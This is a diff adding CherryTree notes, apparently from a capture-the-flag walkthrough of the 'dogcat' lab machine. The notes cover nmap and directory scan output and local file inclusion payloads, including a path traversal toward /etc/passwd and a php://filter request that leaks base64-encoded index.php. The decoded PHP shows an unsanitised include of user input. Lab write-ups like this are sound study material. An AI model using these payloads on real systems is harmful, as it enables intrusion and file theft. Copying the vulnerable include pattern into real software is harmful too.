@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="dogcat" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692711708" ts_lastsave="1692714926">
+    <rich_text>nmap -sC -sV -vv -Pn -n 10.10.189.147
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2431192ab1971a044e2c36ac840a7587 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
+|   256 213d461893aaf9e7c9b54c0f160b71e1 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
+|   256 c1fb7d732b574a8bdcd76f49bb3bd020 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I+
+
+username 			-
+password			-
+
+
+
+
+80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
+|_http-title: dogcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+/cats                 (Status: 301) [Size: 307] [--&gt; </rich_text>
+    <rich_text link="webs http://dogcat.thm/cats/]">http://dogcat.thm/cats/]</rich_text>
+    <rich_text>
+/dogs                 (Status: 301) [Size: 307] [--&gt; </rich_text>
+    <rich_text link="webs http://dogcat.thm/dogs/]">http://dogcat.thm/dogs/]</rich_text>
+    <rich_text>
+/server-status	(Status: 403) [Size: 275
+
+</rich_text>
+    <rich_text link="webs http://10.10.189.147/?view=dog">http://10.10.189.147/?view=dog</rich_text>
+    <rich_text>			-		IDOR RFI vulnerability
+</rich_text>
+    <rich_text link="webs http://10.10.189.147/?view=cat">http://10.10.189.147/?view=cat</rich_text>
+    <rich_text> 
+
+</rich_text>
+    <rich_text link="webs http://10.10.189.147/?view=dog../../../../etc/passwd">http://10.10.189.147/?view=dog../../../../etc/passwd</rich_text>
+    <rich_text>	
+Warning: include(dog../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
+Warning: include(): Failed opening 'dog../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
+
+</rich_text>
+    <rich_text link="webs http://10.10.189.147/?view=php://filter/convert.base64-encode/resource=dog/../index">http://10.10.189.147/?view=php://filter/convert.base64-encode/resource=dog/../index</rich_text>
+    <rich_text>		-		Viewing index.php
+!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Y!m9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
+
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;title&gt;dogcat&lt;/title&gt;
+    &lt;link rel="stylesheet" type="text/css" href="/style.css"&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1&gt;dogcat&lt;/h1&gt;
+    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;
+
+    &lt;div&gt;
+        &lt;h2&gt;What would you like to see?&lt;/h2&gt;
+        &lt;a href="/?view=dog"&gt;&lt;button id="dog"&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href="/?view=cat"&gt;&lt;button id="cat"&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
+        &lt;?php
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+	    </rich_text>
+    <rich_text background="#a5a51d1d2d2d">$ext</rich_text>
+    <rich_text> = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
+            if(isset($_GET['view'])) {
+                if(</rich_text>
+    <rich_text background="#a5a51d1d2d2d">containsStr</rich_text>
+    <rich_text>($_GET['view'], '</rich_text>
+    <rich_text background="#a5a51d1d2d2d">dog</rich_text>
+    <rich_text>') || </rich_text>
+    <rich_text background="#a5a51d1d2d2d">containsStr</rich_text>
+    <rich_text>($_GET['view'], '</rich_text>
+    <rich_text background="#a5a51d1d2d2d">cat</rich_text>
+    <rich_text>')) {
+                    echo 'Here you go!';
+                    include $_GET['view'] . $ext;
+                } else {
+                    echo 'Sorry, only dogs or cats are allowed.';
+                }
+            }
+        ?&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+
+
+
+
+
+</rich_text>
+  </node>
+</cherrytree>
